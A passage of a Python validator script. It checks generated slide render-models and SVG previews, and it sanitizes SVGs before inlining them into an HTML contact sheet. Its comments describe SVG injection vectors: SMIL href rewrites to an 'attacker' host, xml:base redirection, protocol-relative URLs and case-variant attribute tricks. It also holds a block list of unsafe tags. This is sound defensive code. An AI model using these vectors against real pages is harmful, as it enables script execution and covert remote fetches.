#!/usr/bin/env python3
"""validate_visual_quality.py

Stdlib-only **visual quality review gate** for a prepared workspace's
``render_models/*.json`` + ``svg_previews/*.svg`` pair. Inspection only:
no rendering, no PPTX export, no network, no mutation of the workspace.

The intent is to let an agent (or the user) eyeball a generated deck
structurally before opening the .pptx — a contact sheet plus
machine-checkable visual-quality heuristics — without re-running the
six-stage prep or the four-stage render/export pipeline.

WHAT THIS SCRIPT IS NOT
    - It is not an automatic prompt/report-to-PPTX stage; it never
      reads ``input/source.md`` for business content and never plans
      a deck.
    - It is not an image-generation step; it never calls D-One, Qoder,
      any public network, any model API, or any external service. It
      is stdlib-only and offline.
    - It is not a substitute for the runtime pipeline's gates. Schema,
      coverage, layout, KPI-shape, SVG-tag, and PPTX-container checks
      all re-fire downstream — this script is a per-slide visual
      health report, not a structural validator.
    - It does not modify the workspace. Re-runs are byte-identical.

CHECKS (per slide)
    Each render_model + matching SVG pair produces one ``SlideReport``
    with these findings:

    - ``svg_missing`` (ERROR) — render_model exists but
      ``svg_previews/<stem>.svg`` does not.
    - ``svg_unreadable`` (ERROR) — SVG read OSError.
    - ``svg_unparseable`` (ERROR) — SVG read but XML parse failed.
    - ``render_model_unreadable`` / ``render_model_unparseable``
      (ERROR) — corresponding gates for the render_model file.
    - ``blank_slide`` (ERROR) — render_model has zero primitives OR
      its only primitives are an optional layout background fill and
      nothing else editable. Mirrors the
      ``pptx.minimal_evidence.no_blank_slide`` contract intent.
    - ``near_empty_slide`` (WARN) — primitive count below
      ``_NEAR_EMPTY_PRIMITIVE_COUNT`` AND total text characters below
      ``_NEAR_EMPTY_TEXT_CHARS``. Tunable thresholds at top of file;
      adjust if the synthetic fixtures need a different floor.
    - ``image_only_slide`` (WARN) — every primitive is an
      ``image_slot``. Mirrors the
      ``pptx.minimal_evidence.not_all_image_slide`` contract intent
      but at the render_model level so the failure is visible BEFORE
      PPTX export.
    - ``all_placeholder_slide`` (WARN) — every text primitive content
      string matches one of the placeholder needles in
      ``_PLACEHOLDER_NEEDLES`` (case-insensitive substring). The
      synthetic fixtures ship with "placeholder"/"TBD"/"<...>" copy;
      the warning is so the agent doesn't accidentally export a deck
      that still reads as filler.
    - ``no_native_editable_primitive`` (ERROR) — the render_model has
      zero primitives in the editable-intent set
      ``_EDITABLE_PRIMITIVE_KINDS`` (text / shape / line / kpi /
      table). Even an image-bearing slide must carry at least one
      editable primitive in this contract — mirrors the PPTX gate
      ``pptx.minimal_evidence.every_slide_has_native_shape``.
    - ``out_of_canvas_render_model`` (ERROR) — at least one primitive
      bounds box (``x + w`` / ``y + h``) exceeds the render_model
      canvas. ``validate_workspace.check_render_model_bounds`` already
      gates this at runtime; surfaced here so the visual gate output
      names the offending slide too.
    - ``out_of_canvas_svg`` (ERROR) — at least one explicit-numeric
      SVG element (``rect`` / ``line`` / ``image`` / ``ellipse`` /
      ``circle`` / ``text``) has geometry escaping
      ``canvas.width_px`` / ``canvas.height_px``. Same intent as
      ``svg.bounds`` / ``svg.text_anchor`` in
      ``references/quality-gates.md``; re-checked here so the visual
      report calls the slide out.
    - ``text_density_low`` (WARN) — total text chars across all
      ``text`` primitives is below ``_TEXT_DENSITY_LOW_CHARS``.
    - ``text_density_high`` (WARN) — total text chars across all
      ``text`` primitives is above ``_TEXT_DENSITY_HIGH_CHARS``. A
      generous ceiling: it is informational, not a hard refusal, and
      catches the obvious "raw paragraph pasted into a slide" mistake.

AGGREGATE COUNTERS
    - slide count vs. deck_plan.slides[] (when deck_plan.json exists);
    - layout distribution (Counter over render_model.layout);
    - missing-preview count;
    - per-slide primitive count;
    - per-slide text density;
    - per-slide primitive-kind histogram.

OUTPUT
    Always prints a human-readable summary to stdout. If ``--output``
    is supplied, writes either a JSON report (``.json``) or an HTML
    contact sheet (``.html``); the format is chosen by the file
    extension, and any other extension is refused.

    The HTML contact sheet embeds each SVG **inline** with
    **sanitize-by-rejection**: every SVG is parsed and refused for
    inline embedding when it carries any of (a) ``<script>`` /
    ``<foreignObject>`` / ``<use>`` / ``<a>`` / ``<style>``
    elements (script execution and ``<style>``-mediated ``@import`` /
    CSS-expression vectors), or any SMIL/timing/filter-image element
    (``<animate>`` / ``<animateMotion>`` / ``<animateTransform>`` /
    ``<set>`` / ``<discard>`` / ``<mpath>`` / ``<feImage>``) — these
    can either fetch external resources directly (``<feImage>``) or
    mutate another element's ``href`` attribute at runtime via
    ``attributeName="href" to="https://attacker/x"`` after the
    parse-time inspection is over; (b) any ``on*`` event-handler
    attribute; (c) any ``href`` / ``src`` / ``xlink:href`` / ``*href``
    attribute whose value either has surrounding whitespace
    (``" https://attacker/x"`` — browsers strip leading/trailing
    whitespace per the URL-parser spec, which would otherwise let the
    URI-scheme regex bypass be smuggled past the path-safety check
    by a leading space/tab/newline) OR does NOT pass
    ``validate_scaffold.local_path_is_safe`` — the same
    workspace-path-safety rule the rest of the repo enforces, which
    refuses URI schemes (``http:`` / ``https:`` / ``file:`` /
    ``s3:`` / ``ftp:`` / ``data:`` / ``mailto:`` / ``javascript:`` /
    etc.), POSIX-absolute paths (``/etc/passwd``), leading-backslash
    paths (``\\share\\…``), protocol-relative URLs
    (``//attacker/x.png`` — would inherit the contact sheet's
    protocol and fetch from a remote host), ``..`` traversal
    segments, and empty values; (d) any ``style="..."`` attribute on
    any element; (e) any attribute value containing a CSS
    ``url(...)`` reference — these appear in presentation attributes
    like ``fill`` / ``stroke`` / ``mask`` / ``clip-path`` / ``filter``
    / ``cursor`` / ``marker-start`` / ``marker-mid`` / ``marker-end``
    and would fetch the referenced external paint server / filter /
    mask / cursor when the contact sheet is rendered; (f) the
    ``xml:base`` attribute on any element — would rewrite the
    document's base URL so an otherwise-safe relative href like
    ``"assets/cover.svg"`` resolves against the attacker-controlled
    base. A refused SVG is NOT spliced into the page — the contact
    sheet shows a textual
    ``SVG not embedded (unsafe for inline): <reason>`` notice in that
    slide's card instead. A safe SVG is re-serialized from the parsed
    tree (so XML declarations, DOCTYPEs, comments, and processing
    instructions cannot leak into the HTML host page). The contact
    sheet contains no ``file://`` references, no scheme-relative
    references, never fetches a remote asset, and never reaches the
    public network.

EXIT CODES
    0  every per-slide check passed (WARN findings allowed unless
       ``--strict`` is passed, in which case any WARN is promoted to
       ERROR and exits 1).
    1  at least one ERROR finding (or any WARN under ``--strict``).
    2  invocation error (missing required argument, bad --output
       extension, --self-test mixed with orchestration flags, ...).
"""
from __future__ import annotations

import argparse
import html
import json
import re
import sys
import tempfile
from collections import Counter
from dataclasses import dataclass, field
from pathlib import Path
from xml.sax.saxutils import escape as xml_escape

REPO_ROOT = Path(__file__).resolve().parent.parent
SCRIPTS_DIR = REPO_ROOT / "scripts"

sys.path.insert(0, str(SCRIPTS_DIR))

from validate_scaffold import local_path_is_safe  # noqa: E402


# Heuristic thresholds. Tunable; the self-test fixtures pin them so a
# change to either value here MUST be reflected in the fixtures too.
_NEAR_EMPTY_PRIMITIVE_COUNT = 2
_NEAR_EMPTY_TEXT_CHARS = 32
_TEXT_DENSITY_LOW_CHARS = 16
_TEXT_DENSITY_HIGH_CHARS = 1200

# Placeholder phrases the all-placeholder heuristic looks for. Lower-cased
# substring matches. The set is intentionally small — it catches the
# obvious authoring-time filler patterns (the synthetic fixtures'
# "Placeholder X" / "<date-placeholder>" / "TBD" copy) without
# generating noisy WARN findings on legitimate body text.
_PLACEHOLDER_NEEDLES = (
    "placeholder",
    "<placeholder>",
    "tbd",
    "todo",
    "lorem ipsum",
    "<date-placeholder>",
    "<title-placeholder>",
    "<subtitle-placeholder>",
)

# The "editable-intent" primitive set. An image_slot alone does NOT
# count: a slide with only image_slot primitives is the
# every_slide_has_native_shape failure mode the PPTX gate forbids.
# chart_placeholder is also excluded — its render-stage status is TODO.
_EDITABLE_PRIMITIVE_KINDS = frozenset(
    {"text", "shape", "line", "kpi", "table"},
)

SVG_NS = "http://www.w3.org/2000/svg"


@dataclass
class Finding:
    severity: str  # "ERROR" | "WARN"
    name: str
    detail: str = ""


@dataclass
class SlideReport:
    """Per-slide health snapshot. Each field is a plain Python value so
    the JSON output is direct ``dataclasses.asdict`` of a list of these."""
    stem: str  # e.g. "01_cover"
    index: int | None
    layout: str | None
    primitive_count: int
    primitive_kind_histogram: dict[str, int]
    text_char_count: int
    text_word_count: int
    has_native_editable_primitive: bool
    svg_path: str | None  # relative to workspace; None when missing
    findings: list[Finding] = field(default_factory=list)

    def err(self, name: str, detail: str = "") -> None:
        self.findings.append(Finding("ERROR", name, detail))

    def warn(self, name: str, detail: str = "") -> None:
        self.findings.append(Finding("WARN", name, detail))

    @property
    def errors(self) -> list[Finding]:
        return [f for f in self.findings if f.severity == "ERROR"]

    @property
    def warnings(self) -> list[Finding]:
        return [f for f in self.findings if f.severity == "WARN"]


@dataclass
class WorkspaceReport:
    workspace: str
    slide_count_render_models: int
    slide_count_deck_plan: int | None  # None when deck_plan.json absent / unloadable
    layout_distribution: dict[str, int]
    missing_svg_count: int
    slides: list[SlideReport] = field(default_factory=list)
    workspace_findings: list[Finding] = field(default_factory=list)

    @property
    def total_errors(self) -> int:
        return sum(len(s.errors) for s in self.slides) + len(
            [f for f in self.workspace_findings if f.severity == "ERROR"],
        )

    @property
    def total_warnings(self) -> int:
        return sum(len(s.warnings) for s in self.slides) + len(
            [f for f in self.workspace_findings if f.severity == "WARN"],
        )


# ---------------------------------------------------------------------------
# Loaders.
# ---------------------------------------------------------------------------


def _try_load_json(path: Path) -> tuple[object | None, str]:
    if not path.is_file():
        return None, f"missing {path}"
    try:
        return json.loads(path.read_text(encoding="utf-8")), ""
    except OSError as exc:
        return None, f"read error: {exc}"
    except (UnicodeDecodeError, json.JSONDecodeError) as exc:
        return None, f"parse error: {exc}"


def _parse_svg(path: Path) -> tuple[object | None, str]:
    import xml.etree.ElementTree as ET
    try:
        text = path.read_text(encoding="utf-8")
    except OSError as exc:
        return None, f"read error: {exc}"
    except UnicodeDecodeError as exc:
        return None, f"decode error: {exc}"
    try:
        return ET.fromstring(text), ""
    except ET.ParseError as exc:
        return None, f"parse error: {exc}"


def _strip_ns(tag: str) -> str:
    return tag.split("}", 1)[1] if tag.startswith("{") else tag


def _iter_elements(root) -> list:
    return list(root.iter())


def _as_float(value: object) -> float | None:
    """Return value as float when it parses cleanly. We accept what the
    SVG renderer emits today (pixel ints + 6-decimal fractional pixels);
    a value with a unit suffix like '12px' is intentionally not parsed
    here — the renderer omits unit suffixes, so anything carrying one
    is something we should NOT silently interpret."""
    if isinstance(value, (int, float)) and not isinstance(value, bool):
        return float(value)
    if isinstance(value, str):
        s = value.strip()
        if not s:
            return None
        try:
            return float(s)
        except ValueError:
            return None
    return None


# ---------------------------------------------------------------------------
# Per-slide inspection.
# ---------------------------------------------------------------------------


def _inspect_slide(
    rm_path: Path,
    sp_dir: Path,
    workspace: Path,
) -> SlideReport:
    stem = rm_path.stem
    rm_raw, rm_err = _try_load_json(rm_path)
    rm = rm_raw if isinstance(rm_raw, dict) else None

    primitives: list[dict] = []
    if rm is not None:
        raw_primitives = rm.get("primitives")
        if isinstance(raw_primitives, list):
            primitives = [p for p in raw_primitives if isinstance(p, dict)]

    histogram: Counter = Counter()
    text_chars = 0
    text_words = 0
    text_pieces: list[str] = []
    for p in primitives:
        kind = p.get("kind") if isinstance(p.get("kind"), str) else "<unknown>"
        histogram[kind] += 1
        if kind == "text":
            t = p.get("text")
            if isinstance(t, dict):
                content = t.get("content")
                if isinstance(content, str):
                    text_chars += len(content)
                    text_words += len(content.split())
                    text_pieces.append(content)

    has_editable = any(
        isinstance(p.get("kind"), str) and p["kind"] in _EDITABLE_PRIMITIVE_KINDS
        for p in primitives
    )

    index = rm.get("index") if rm is not None else None
    layout = rm.get("layout") if rm is not None else None
    if not isinstance(index, int) or isinstance(index, bool):
        index = None
    if not isinstance(layout, str) or not layout:
        layout = None

    svg_path = sp_dir / f"{stem}.svg"
    svg_rel = (
        str(svg_path.relative_to(workspace))
        if svg_path.is_file()
        else None
    )

    report = SlideReport(
        stem=stem,
        index=index,
        layout=layout,
        primitive_count=len(primitives),
        primitive_kind_histogram=dict(histogram),
        text_char_count=text_chars,
        text_word_count=text_words,
        has_native_editable_primitive=has_editable,
        svg_path=svg_rel,
    )

    if rm is None:
        report.err("render_model_unparseable", rm_err)
        return report

    # Bounds inside canvas — best-effort, treats missing canvas as "no
    # check available" so a schema-invalid render_model is reported once
    # (above) not twice.
    canvas = rm.get("canvas")
    canvas_w = canvas.get("width_px") if isinstance(canvas, dict) else None
    canvas_h = canvas.get("height_px") if isinstance(canvas, dict) else None
    if isinstance(canvas_w, int) and isinstance(canvas_h, int):
        bad: list[str] = []
        for p in primitives:
            b = p.get("bounds")
            if not isinstance(b, dict):
                continue
            x = b.get("x"); y = b.get("y")
            w = b.get("w"); h = b.get("h")
            if not all(isinstance(v, int) for v in (x, y, w, h)):
                continue
            if x + w > canvas_w or y + h > canvas_h or x < 0 or y < 0:
                bad.append(
                    f"primitive {p.get('id')!r} bounds "
                    f"({x},{y},{w},{h}) exceeds canvas "
                    f"({canvas_w}x{canvas_h})",
                )
        if bad:
            report.err(
                "out_of_canvas_render_model",
                "; ".join(bad),
            )

    # SVG presence / parsing / out-of-canvas geometry.
    if not svg_path.is_file():
        report.err(
            "svg_missing",
            f"no svg_previews/{stem}.svg",
        )
    else:
        tree, parse_err = _parse_svg(svg_path)
        if tree is None:
            report.err(
                "svg_unparseable" if "parse" in parse_err else "svg_unreadable",
                parse_err,
            )
        elif isinstance(canvas_w, int) and isinstance(canvas_h, int):
            bad: list[str] = []
            for el in _iter_elements(tree):
                raw_tag = el.tag
                if not isinstance(raw_tag, str):
                    # ElementTree represents processing instructions
                    # and comments with a callable `tag`; skip them
                    # — they have no SVG geometry.
                    continue
                # Case-fold the element tag AND every attribute key so
                # an HTML host's case-corrected variants (e.g.
                # <RECT X="..." WIDTH="..."> → <rect x="..." width="...">)
                # are still checked. HTML5's SVG attribute-name
                # adjustment table lowercases most geometry attributes
                # before the SVG renders, so a case-sensitive
                # attrib.get("x") would miss an attacker-supplied
                # uppercase attribute and the out-of-canvas geometry
                # would slip the gate.
                #
                # **Duplicate-case detection.** A naive `dict[k.lower()] = v`
                # write loop would let the SECOND case-variant of a
                # geometry attribute overwrite the first — and the
                # browser uses the OPPOSITE rule (HTML5 keeps the
                # first case-folded attribute and ignores the rest).
                # An attacker could author <rect X="3000" Y="3000"
                # WIDTH="5000" HEIGHT="5000" x="0" y="0" width="100"
                # height="100"/> where ET's items() iteration ends on
                # the safe values; the validator would call the rect
                # on-canvas while the browser renders it off-canvas.
                # Treat any duplicate-case attribute as out-of-canvas
                # so the per-slide ERROR still surfaces — the
                # legitimate SVG generator never emits duplicates.
                tag = _strip_ns(raw_tag).lower()
                attrib: dict[str, str] = {}
                seen_lower: set[str] = set()
                duplicate_attrs: list[str] = []
                for k, v in el.attrib.items():
                    if not isinstance(k, str) or not isinstance(v, str):
                        continue
                    folded = _strip_ns(k).lower()
                    if folded in seen_lower:
                        duplicate_attrs.append(folded)
                    seen_lower.add(folded)
                    attrib[folded] = v
                if duplicate_attrs:
                    bad.append(
                        f"<{tag}> has duplicate case-folded attribute(s) "
                        f"{sorted(set(duplicate_attrs))} — refused so "
                        f"an HTML host's first-wins resolution cannot "
                        f"diverge from the validator's view"
                    )
                    continue
                if tag == "rect" or tag == "image":
                    x = _as_float(attrib.get("x", "0"))
                    y = _as_float(attrib.get("y", "0"))
                    w = _as_float(attrib.get("width"))
                    h = _as_float(attrib.get("height"))
                    if None in (x, y, w, h):
                        continue
                    if x + w > canvas_w + 0.5 or y + h > canvas_h + 0.5 or x < -0.5 or y < -0.5:
                        bad.append(
                            f"<{tag}> at ({x},{y},{w},{h}) exceeds "
                            f"canvas ({canvas_w}x{canvas_h})",
                        )
                elif tag == "line":
                    x1 = _as_float(attrib.get("x1"))
                    y1 = _as_float(attrib.get("y1"))
                    x2 = _as_float(attrib.get("x2"))
                    y2 = _as_float(attrib.get("y2"))
                    if None in (x1, y1, x2, y2):
                        continue
                    if max(x1, x2) > canvas_w + 0.5 or max(y1, y2) > canvas_h + 0.5 \
                       or min(x1, x2) < -0.5 or min(y1, y2) < -0.5:
                        bad.append(
                            f"<line> ({x1},{y1})->({x2},{y2}) exceeds "
                            f"canvas ({canvas_w}x{canvas_h})",
                        )
                elif tag == "circle":
                    cx = _as_float(attrib.get("cx"))
                    cy = _as_float(attrib.get("cy"))
                    r = _as_float(attrib.get("r"))
                    if None in (cx, cy, r):
                        continue
                    if cx + r > canvas_w + 0.5 or cy + r > canvas_h + 0.5 \
                       or cx - r < -0.5 or cy - r < -0.5:
                        bad.append(
                            f"<circle> cx={cx} cy={cy} r={r} exceeds "
                            f"canvas ({canvas_w}x{canvas_h})",
                        )
                elif tag == "ellipse":
                    cx = _as_float(attrib.get("cx"))
                    cy = _as_float(attrib.get("cy"))
                    rx = _as_float(attrib.get("rx"))
                    ry = _as_float(attrib.get("ry"))
                    if None in (cx, cy, rx, ry):
                        continue
                    if cx + rx > canvas_w + 0.5 or cy + ry > canvas_h + 0.5 \
                       or cx - rx < -0.5 or cy - ry < -0.5:
                        bad.append(
                            f"<ellipse> cx={cx} cy={cy} rx={rx} ry={ry} "
                            f"exceeds canvas ({canvas_w}x{canvas_h})",
                        )
                elif tag == "text":
                    x = _as_float(attrib.get("x"))
                    y = _as_float(attrib.get("y"))
                    if x is None or y is None:
                        continue
                    if x < -0.5 or y < -0.5 or x > canvas_w + 0.5 or y > canvas_h + 0.5:
                        bad.append(
                            f"<text> anchor ({x},{y}) outside canvas "
                            f"({canvas_w}x{canvas_h})",
                        )
            if bad:
                report.err(
                    "out_of_canvas_svg",
                    "; ".join(bad),
                )

    # Blank / near-empty / image-only / all-placeholder.
    if len(primitives) == 0:
        report.err(
            "blank_slide",
            "render_model has zero primitives",
        )
    if not has_editable and primitives:
        # Pure image_slot / pure chart_placeholder slide.
        kinds = sorted({
            p.get("kind") for p in primitives if isinstance(p.get("kind"), str)
        })
        if kinds == ["image_slot"]:
            report.warn(
                "image_only_slide",
                f"every primitive is image_slot ({len(primitives)} total); "
                f"every slide must carry at least one native editable "
                f"primitive ({sorted(_EDITABLE_PRIMITIVE_KINDS)})",
            )
        report.err(
            "no_native_editable_primitive",
            f"primitive kinds present: {kinds}",
        )
    if primitives and (
        len(primitives) < _NEAR_EMPTY_PRIMITIVE_COUNT
        and text_chars < _NEAR_EMPTY_TEXT_CHARS
    ):
        report.warn(
            "near_empty_slide",
            f"primitive_count={len(primitives)} (<{_NEAR_EMPTY_PRIMITIVE_COUNT}), "
            f"text_chars={text_chars} (<{_NEAR_EMPTY_TEXT_CHARS})",
        )
    if text_pieces:
        all_placeholders = all(
            _looks_like_placeholder(t) for t in text_pieces
        )
        if all_placeholders:
            report.warn(
                "all_placeholder_slide",
                f"every text primitive ({len(text_pieces)}) matches a "
                f"placeholder needle in _PLACEHOLDER_NEEDLES",
            )

    # Text density.
    if text_pieces and text_chars < _TEXT_DENSITY_LOW_CHARS:
        report.warn(
            "text_density_low",
            f"text_chars={text_chars} (<{_TEXT_DENSITY_LOW_CHARS})",
        )
    if text_chars > _TEXT_DENSITY_HIGH_CHARS:
        report.warn(
            "text_density_high",
            f"text_chars={text_chars} (>{_TEXT_DENSITY_HIGH_CHARS})",
        )

    return report


def _looks_like_placeholder(s: str) -> bool:
    lowered = s.lower().strip()
    if not lowered:
        return True
    for needle in _PLACEHOLDER_NEEDLES:
        if needle in lowered:
            return True
    return False


# ---------------------------------------------------------------------------
# Workspace walk.
# ---------------------------------------------------------------------------


def inspect_workspace(workspace: Path) -> WorkspaceReport:
    """Build a WorkspaceReport by walking render_models/ + svg_previews/.

    Workspace-level findings (rather than per-slide) include:
      - render_models/ missing or empty;
      - workspace_path is a symlink (refused, mirroring the
        run_pipeline / init_* helpers' anti-pattern).
    """
    report = WorkspaceReport(
        workspace=str(workspace),
        slide_count_render_models=0,
        slide_count_deck_plan=None,
        layout_distribution={},
        missing_svg_count=0,
    )

    if workspace.is_symlink():
        report.workspace_findings.append(Finding(
            "ERROR", "workspace_symlink",
            f"{workspace} is a symlink (refused)",
        ))
        return report
    if not workspace.is_dir():
        report.workspace_findings.append(Finding(
            "ERROR", "workspace_not_directory",
            f"{workspace} is not a directory",
        ))
        return report

    rm_dir = workspace / "render_models"
    sp_dir = workspace / "svg_previews"
    if rm_dir.is_symlink():
        report.workspace_findings.append(Finding(
            "ERROR", "render_models_symlink",
            f"{rm_dir} is a symlink (refused)",
        ))
        return report
    if not rm_dir.is_dir():
        report.workspace_findings.append(Finding(
            "ERROR", "render_models_missing",
            f"{rm_dir} does not exist; nothing to inspect",
        ))
        return report
    if sp_dir.is_symlink():
        report.workspace_findings.append(Finding(
            "ERROR", "svg_previews_symlink",
            f"{sp_dir} is a symlink (refused)",
        ))
        return report

    rm_files = sorted(rm_dir.glob("*.json"))
    if not rm_files:
        report.workspace_findings.append(Finding(
            "ERROR", "render_models_empty",
            f"{rm_dir} contains no *.json files",
        ))
        return report

    deck_plan_raw, _ = _try_load_json(workspace / "deck_plan.json")
    if isinstance(deck_plan_raw, dict):
        slides = deck_plan_raw.get("slides")
        if isinstance(slides, list):
            report.slide_count_deck_plan = len(slides)

    layout_counter: Counter = Counter()
    for rm in rm_files:
        slide = _inspect_slide(rm, sp_dir, workspace)
        if slide.layout:
            layout_counter[slide.layout] += 1
        if slide.svg_path is None:
            report.missing_svg_count += 1
        report.slides.append(slide)

    report.slide_count_render_models = len(rm_files)
    report.layout_distribution = dict(layout_counter)

    # Coverage cross-check against deck_plan when present.
    if (
        report.slide_count_deck_plan is not None
        and report.slide_count_deck_plan != report.slide_count_render_models
    ):
        report.workspace_findings.append(Finding(
            "ERROR", "deck_plan_render_count_mismatch",
            f"deck_plan declares {report.slide_count_deck_plan} slides "
            f"but {report.slide_count_render_models} render_models exist",
        ))

    return report


# ---------------------------------------------------------------------------
# Reporting.
# ---------------------------------------------------------------------------


def _format_finding(f: Finding) -> str:
    suffix = f" — {f.detail}" if f.detail else ""
    return f"    [{f.severity}] {f.name}{suffix}"


def _format_text_report(report: WorkspaceReport) -> str:
    lines: list[str] = []
    lines.append(f"workspace: {report.workspace}")
    lines.append(
        f"slides: {report.slide_count_render_models} render_models, "
        f"deck_plan={report.slide_count_deck_plan}",
    )
    lines.append(
        f"missing SVG previews: {report.missing_svg_count}",
    )
    if report.layout_distribution:
        layout_list = ", ".join(
            f"{name}={count}"
            for name, count in sorted(report.layout_distribution.items())
        )
        lines.append(f"layout distribution: {layout_list}")
    if report.workspace_findings:
        lines.append("workspace findings:")
        for f in report.workspace_findings:
            lines.append(_format_finding(f))
    if not report.slides:
        lines.append("no per-slide reports produced")
    else:
        lines.append("per-slide:")
        for s in report.slides:
            head = (
                f"  {s.stem} (index={s.index}, layout={s.layout}, "
                f"primitives={s.primitive_count}, "
                f"text_chars={s.text_char_count}, "
                f"editable_primitive={s.has_native_editable_primitive})"
            )
            lines.append(head)
            for f in s.findings:
                lines.append(_format_finding(f))
    n_err = report.total_errors
    n_warn = report.total_warnings
    if n_err:
        lines.append(
            f"FAIL: {n_err} error(s), {n_warn} warning(s).",
        )
    elif n_warn:
        lines.append(
            f"OK (with warnings): 0 errors, {n_warn} warning(s).",
        )
    else:
        lines.append("OK: no findings — every slide passed.")
    return "\n".join(lines)


def _report_to_dict(report: WorkspaceReport) -> dict:
    return {
        "workspace": report.workspace,
        "slide_count_render_models": report.slide_count_render_models,
        "slide_count_deck_plan": report.slide_count_deck_plan,
        "layout_distribution": report.layout_distribution,
        "missing_svg_count": report.missing_svg_count,
        "workspace_findings": [
            {"severity": f.severity, "name": f.name, "detail": f.detail}
            for f in report.workspace_findings
        ],
        "slides": [
            {
                "stem": s.stem,
                "index": s.index,
                "layout": s.layout,
                "primitive_count": s.primitive_count,
                "primitive_kind_histogram": s.primitive_kind_histogram,
                "text_char_count": s.text_char_count,
                "text_word_count": s.text_word_count,
                "has_native_editable_primitive": s.has_native_editable_primitive,
                "svg_path": s.svg_path,
                "findings": [
                    {"severity": f.severity, "name": f.name, "detail": f.detail}
                    for f in s.findings
                ],
            }
            for s in report.slides
        ],
        "totals": {
            "errors": report.total_errors,
            "warnings": report.total_warnings,
        },
    }


def _write_json_report(report: WorkspaceReport, output: Path) -> None:
    output.write_text(
        json.dumps(_report_to_dict(report), indent=2, sort_keys=True) + "\n",
        encoding="utf-8",
    )


# Elements that must not appear in an SVG we are about to inline into
# an HTML host page. <script> can execute JavaScript. <foreignObject>
# embeds arbitrary HTML/XHTML — including <script>. <use> and <a> can
# host external content via href / xlink:href. <style> can pull a
# remote stylesheet via @import url(...) or carry CSS expressions /
# behaviors. SMIL animation elements (<animate>, <animateMotion>,
# <animateTransform>, <set>, <discard>, <mpath>) can mutate other
# elements' attributes at runtime — in particular, <set
# attributeName="href" to="https://attacker/x"/> would silently
# rewrite an otherwise-safe href into a fetchable remote URL after
# parse-time inspection. <feImage> can fetch external bitmaps as a
# filter primitive. Re-checked here for defense in depth — the
# generator and the workspace validator already refuse most of these
# on the workspace side, but this validator is run as a downstream
# review tool and the user may invoke it against a workspace whose
# SVGs were hand-edited or tampered with. We do not try to scrub
# these elements out of the SVG; we refuse to inline the SVG and
# surface a textual notice instead.
#
# Tag names are stored lower-cased and looked up after .lower()-ing
# the parsed tag. SVG is case-sensitive when served as
# image/svg+xml, but when inlined into an HTML document the HTML5
# parser applies the SVG element-name adjustment table that maps
# every case variant of these names (e.g. "foreignobject" /
# "FOREIGNOBJECT" / "foReiGnObJeCt") to the canonical camelCase form
# and then renders them as the corresponding SVG element. A
# case-sensitive comparison would therefore miss every
# non-canonical-case bypass.
_UNSAFE_INLINE_TAGS = frozenset({
    "script", "foreignobject", "use", "a", "style",
    "animate", "animatemotion", "animatetransform", "set",
    "discard", "mpath", "feimage",
})

# CSS url(...) references appear in presentation attributes like
# fill, stroke, mask, filter, clip-path, cursor, marker, marker-start,
# marker-mid, marker-end, etc. When the url() points outside the
# document (https:, //host/, /abs/, ../traversal), browsers fetch the
# referenced resource to resolve the paint server / filter / mask /
# cursor image. The generator does not emit any url(...) reference,
# so refusing the substring outright is safe for legitimate workspace
# SVGs and closes every presentation-attribute fetch vector that the
# href/src/xlink:href gate alone cannot see.
_URL_FUNC_RE = re.compile(r"url\s*\(", re.IGNORECASE)

# XML-namespace base-URL attribute. <svg xml:base="https://attacker/">
# rewrites the base URL used to resolve every relative href inside the
# document — turning an otherwise-safe relative href like
# "assets/cover.svg" into a remote fetch at parse-time-invisible cost.
_XML_BASE_ATTR = "{http://www.w3.org/XML/1998/namespace}base"


def _svg_safety_check(svg_text: str) -> tuple[object | None, str]:
    """Parse and check an SVG for inline-safety. Returns (root, '')
    when the SVG is safe to inline (root is the parsed
    ElementTree.Element). Returns (None, reason) when the SVG must NOT
    be inlined; the caller falls back to a textual notice in the HTML
    contact sheet card.

    Reference values on href / src / xlink:href / *href attributes are
    routed through ``validate_scaffold.local_path_is_safe`` — the same
    gate the workspace validator uses for image_manifest.local_path.
    The rule rejects: empty values, POSIX-absolute paths (``/foo``),
    leading-backslash (``\\foo``), protocol-relative URLs
    (``//host/foo`` — would otherwise inherit the contact sheet's
    protocol and fetch from a remote host), any URI scheme prefix
    (``http:`` / ``https:`` / ``file:`` / ``s3:`` / ``data:`` /
    ``mailto:`` / ``javascript:`` / etc.), and any ``..`` segment
    (would let an inline-SVG's `<image>` reach files outside the
    workspace via the HTML host's base directory)."""
    import xml.etree.ElementTree as ET
    try:
        root = ET.fromstring(svg_text)
    except ET.ParseError as exc:
        return None, f"SVG parse error: {exc}"
    if (
        _strip_ns(root.tag) != "svg"
        or root.tag != f"{{{SVG_NS}}}svg"
    ):
        return None, (
            f"root element is not <svg> in the SVG namespace: "
            f"{root.tag!r}"
        )
    for el in root.iter():
        # ElementTree represents processing instructions and comments
        # as Element objects whose `tag` is a callable (e.g. the
        # ProcessingInstruction / Comment factory) rather than a
        # string. Skip those defensively — they don't produce
        # inline-fetchable content and the per-attribute checks below
        # would otherwise crash on `_strip_ns(<function>)`. PIs are
        # also dropped by `ET.tostring(root, ...)` re-serialization
        # at the document level, so they cannot leak into the host
        # page even when present inside the element tree.
        if not isinstance(el.tag, str):
            continue
        tag = _strip_ns(el.tag)
        # Case-fold before lookup: an HTML host case-corrects every
        # variant of these tag names back to the canonical SVG form
        # before rendering (e.g. <foreignobject> becomes <foreignObject>
        # and the contained <script> executes), so a case-sensitive
        # comparison would miss every wacky-case bypass.
        if tag.lower() in _UNSAFE_INLINE_TAGS:
            return None, f"contains unsafe element <{tag}>"
        # Refuse duplicate case-folded attribute keys on any element —
        # including the root `<svg>`. XML preserves both `viewBox` and
        # `VIEWBOX` as distinct attributes, but an HTML host that
        # case-folds attribute names with first-wins resolution would
        # use whichever variant appeared first in the source. On the
        # SVG root that means an attacker can author
        # `<svg VIEWBOX="0 0 99999 99999" viewBox="0 0 1920 1080">`
        # and the inlined SVG will render with a 99999x99999 canvas,
        # absorbing any out-of-canvas geometry the per-slide check
        # would otherwise have flagged. The legitimate SVG generator
        # never emits duplicate-case attributes, so any collision is
        # suspicious by construction — refuse the SVG outright and
        # let the contact sheet show the fallback notice instead.
        seen_lower: set[str] = set()
        for k in el.attrib:
            if not isinstance(k, str):
                continue
            folded = _strip_ns(k).lower()
            if folded in seen_lower:
                return None, (
                    f"contains duplicate case-folded attribute "
                    f"{folded!r} on <{tag}> — refused so an HTML "
                    f"host's first-wins resolution cannot diverge "
                    f"from the inline-SVG sanitizer's view"
                )
            seen_lower.add(folded)
        for attr_name, attr_value in el.attrib.items():
            # ElementTree namespace-qualified attributes look like
